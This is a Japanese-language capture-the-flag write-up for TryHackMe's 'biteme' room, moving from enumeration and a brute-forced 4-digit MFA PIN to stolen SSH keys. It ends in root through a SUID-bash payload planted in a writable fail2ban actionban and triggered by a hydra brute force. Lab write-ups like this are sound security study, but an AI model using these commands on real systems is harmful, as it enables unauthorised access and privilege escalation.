# biteme CTF

https://tryhackme.com/room/biteme

## Enumeration

```shell
TARGET=10.201.6.54
sudo bash -c "echo $TARGET   biteme.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, HTTP

### ディレクトリ列挙

/console を発見

```sh
dirb http://$TARGET

---- Scanning URL: http://10.201.6.54/ ----
==> DIRECTORY: http://10.201.6.54/console/                                                                                                                              
+ http://10.201.6.54/index.html (CODE:200|SIZE:10918)                                                                                                                   
+ http://10.201.6.54/server-status (CODE:403|SIZE:276)                                                                                                                  
                                                                                                                                                                        
---- Entering directory: http://10.201.6.54/console/ ----
==> DIRECTORY: http://10.201.6.54/console/css/                                                                                                                          
+ http://10.201.6.54/console/index.php (CODE:200|SIZE:3961)                                                                                                             
+ http://10.201.6.54/console/robots.txt (CODE:200|SIZE:25)                                                                                                              
==> DIRECTORY: http://10.201.6.54/console/securimage/                                                                                                                   
                                                                                                                                                                        
---- Entering directory: http://10.201.6.54/console/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                        
---- Entering directory: http://10.201.6.54/console/securimage/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://$TARGET/console -w ./dirlist.txt -t 64 -k

/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 316] [--> http://10.201.6.54/console/css/]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/functions.php        (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 3961]
/mfa.php              (Status: 302) [Size: 0] [--> index.php]
/robots.txt           (Status: 200) [Size: 25]
/securimage           (Status: 301) [Size: 323]
```

/securimage/README.txt

```
NAME:
    Securimage - A PHP class for creating captcha images and audio with many options.
VERSION:
    3.6.8
```

3.6.8 には認証バイパスは無さそう

```sh
$ searchsploit Securimage            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP Captcha / Securimage 2.0.2 - Authentication Bypass                                                                                                                                                    | php/webapps/17309.txt
Securimage - 'example_form.php' Cross-Site Scripting                                                                                                                                                      | php/webapps/38509.txt
WordPress Plugin Securimage-WP - 'siwp_test.php' Cross-Site Scripting                                                                                                                                     | php/webapps/38510.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

適当にパスワードを入れて送信すると、クライアント側で下記のコードが実行される。

```js
document.getElementById('clicked').value = 'yes';
console.log('@fred I turned on php file syntax highlighting for you to review jason...');
```

コードが見える状態になっているPHPがあるのではないかと考えた。が、出ない。

```sh
root@ip-10-201-13-65:~# gobuster dir -q -x=php,phps,php~ -u http://$TARGET/console -w ./dirlist.txt -t 64 -k -b 403,404
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 316] [--> http://10.201.6.54/console/css/]
/dashboard.php        (Status: 302) [Size: 0] [--> index.php]
/functions.php        (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 3961]
/mfa.php              (Status: 302) [Size: 0] [--> index.php]
/robots.txt           (Status: 200) [Size: 25]
/securimage           (Status: 301) [Size: 323]

root@ip-10-201-13-65:~# gobuster dir -q -x=php2,php3,php4,php5,php6,php7,pht,phtm,phtml,pgif,shtml,phar,inc.hphp -u http://$TARGET/console -w ./dirlist.txt -t 64 -k -b 403,404
/css                  (Status: 301) [Size: 316] [--> http://10.201.6.54/console/css/]
/robots.txt           (Status: 200) [Size: 25]
/securimage           (Status: 301) [Size: 323]
```

jsonでもなかった。

```sh
root@ip-10-201-13-65:~# gobuster dir -q -x=json,jason -u http://$TARGET/console -w ./dirlist.txt -t 64 -k -b 403,404
/css                  (Status: 301) [Size: 316] [--> http://10.201.6.54/console/css/]
/robots.txt           (Status: 200) [Size: 25]
/securimage           (Status: 301) [Size: 323]
```

アイデアが尽きたのでウォークスルーを見たら、/console/index.phps にアクセスしたらソースが表示されるはずだそうだが、実際には403が返っている。

2025年8月ごろから、Discordで同じ問題を報告しているユーザーが数人いるのでルームのバグと判断。

修正されてから再挑戦したいところだが、期待できないので公式ウォークスルーから下記認証情報を入手してログインした。

```
jason_test_account
violet
```

4桁のPINコードが要求される。

ソースを見ると、ブルートフォースが効くというヒント。

```js
    <script>
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'@2 3 4 5 6 7 8 9 a b c, d e f g h... i\');',19,19,'console|log|fred|we|need|to|put|some|brute|force|protection|on|here|remind|me|in|the|morning|jason'.split('|'),0,{}));
        return true;
      }
    </script>
```

ブルートフォース

```sh
$ ffuf -u http://biteme.thm/console/mfa.php -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d 'code=FUZZ' -fr 'Incorrect code' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=qnnlvkv2bbuu37rh83s1j647bg; user=jason_test_account; pwd=violet'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://biteme.thm/console/mfa.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=qnnlvkv2bbuu37rh83s1j647bg; user=jason_test_account; pwd=violet
 :: Data             : code=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Incorrect code
________________________________________________

[REDACTED]                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 329ms]
```

ls と cat の機能を持つ画面が表示された。

File Viewr で、/etc/passwd を読めることを確認

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jason:x:1000:1000:jason:/home/jason:/bin/bash
fred:x:1001:1001::/home/fred:/bin/sh
systemd-timesync:x:111:114:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:112:117:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:113:118::/nonexistent:/usr/sbin/nologin
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:115:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

jason の id_rsa を入手できた。rockyou.txt でパスフレーズをクラックしてSSH接続可能。

## 権限昇格

パスワードが分かれば何でもできるが、分からなければ fred にしかなれない。

```sh
jason@ip-10-201-6-54:~$ sudo -l
Matching Defaults entries for jason on ip-10-201-6-54:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on ip-10-201-6-54:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```

権限的には、fredになった方が良いかは疑問。

```sh
jason@ip-10-201-6-54:~$ id jason
uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

jason@ip-10-201-6-54:~$ id fred
uid=1001(fred) gid=1001(fred) groups=1001(fred)
```

パスワードを探したが見つからなかったので、fredになってみる。

fail2banサービスをリスタートできる。

```sh
jason@ip-10-201-6-54:~$ sudo -u fred bash
fred@ip-10-201-6-54:/home/jason$ id
uid=1001(fred) gid=1001(fred) groups=1001(fred)
fred@ip-10-201-6-54:/home/jason$ sudo -l
Matching Defaults entries for fred on ip-10-201-6-54:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-201-6-54:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
```

fail2banサービス

```sh
fred@ip-10-201-6-54:/home/jason$ systemctl cat fail2ban
# /lib/systemd/system/fail2ban.service
[Unit]
Description=Fail2Ban Service
Documentation=man:fail2ban(1)
After=network.target iptables.service firewalld.service ip6tables.service ipset.service nftables.service
PartOf=firewalld.service

[Service]
Type=simple
ExecStartPre=/bin/mkdir -p /run/fail2ban
ExecStart=/usr/bin/fail2ban-server -xf start
# if should be logged in systemd journal, use following line or set logtarget to sysout in fail2ban.local
# ExecStart=/usr/bin/fail2ban-server -xf --logtarget=sysout start
ExecStop=/usr/bin/fail2ban-client stop
ExecReload=/usr/bin/fail2ban-client reload
PIDFile=/run/fail2ban/fail2ban.pid
Restart=on-failure
RestartPreventExitStatus=0 255

[Install]
WantedBy=multi-user.target
```

サービス自体を変更はできない。

```sh
fred@ip-10-201-6-54:/home/jason$ ls -al /lib/systemd/system/fail2ban.service
-rw-r--r-- 1 root root 682 Mar  2  2020 /lib/systemd/system/fail2ban.service
```

fail2ban の昇格について  
https://juggernaut-sec.com/fail2ban-lpe/

```sh
fred@ip-10-201-6-54:/etc/fail2ban$ cat /etc/fail2ban/jail.local 
[sshd]
enabled   = true
maxretry  = 3
findtime  = 2m
bantime   = 2m
banaction = iptables-multiport
```

/etc/fail2ban/action.d には誰でも書き込みできる状態

```sh
fred@ip-10-201-6-54:/home/jason$ cd /etc/fail2ban && ls -l
total 84
drwxrwxrwx 2 root root 12288 Apr 26  2025 action.d
-rw-r--r-- 1 root root  2817 Jan 11  2020 fail2ban.conf
drwxr-xr-x 2 root root  4096 Apr  4  2018 fail2ban.d
drwxr-xr-x 3 root root 12288 Apr 26  2025 filter.d
-rw-r--r-- 1 root root 25740 Jan 11  2020 jail.conf
drwxr-xr-x 2 root root  4096 Apr 26  2025 jail.d
-rw-r--r-- 1 root root    99 Nov 13  2021 jail.local
-rw-r--r-- 1 root root   645 Jan 18  2018 paths-arch.conf
-rw-r--r-- 1 root root  2827 Jan 18  2018 paths-common.conf
-rw-r--r-- 1 root root   573 Jan 18  2018 paths-debian.conf
-rw-r--r-- 1 root root   738 Jan 18  2018 paths-opensuse.conf
```

iptables-multiport.conf だけ fredオーナーになっている状態。。

```sh
fred@ip-10-201-6-54:/etc/fail2ban$ ls -al /etc/fail2ban/action.d
total 304
drwxrwxrwx 2 root root 12288 Apr 26  2025 .
drwxr-xr-x 6 root root  4096 Apr 26  2025 ..
...
-rw-r--r-- 1 fred root  1508 Jan 11  2020 iptables-multiport.conf
...
```

iptables-multiport.conf を編集する。

```
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = cp /bin/bash /home/fred/bash && chmod 4755 /home/fred/bash
```

banを発生させる。

```sh
$ hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt ssh://10.201.6.54
```

成功。

```sh
fred@ip-10-201-6-54:/etc/fail2ban$ ls -al /home/fred
total 1180
drwxr-xr-x 3 fred fred    4096 Nov  1 02:34 .
drwxr-xr-x 6 root root    4096 Oct 31 23:50 ..
-rwsr-xr-x 1 root root 1183448 Nov  1 02:37 bash
-rw-r--r-- 1 fred fred     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 fred fred    3771 Apr  4  2018 .bashrc
drwxr-xr-x 3 fred fred    4096 Sep 24  2021 .local
-rw-r--r-- 1 fred fred     807 Apr  4  2018 .profile
```

```sh
fred@ip-10-201-6-54:/etc/fail2ban$ /home/fred/bash -p
bash-5.0# id
uid=1001(fred) gid=1001(fred) euid=0(root) groups=1001(fred)
```

## 振り返り

- ルームが壊れているせいで一番おもしろい部分のアハ体験の機会を逃して残念きわまりない。
- fail2ban は良い勉強になった。
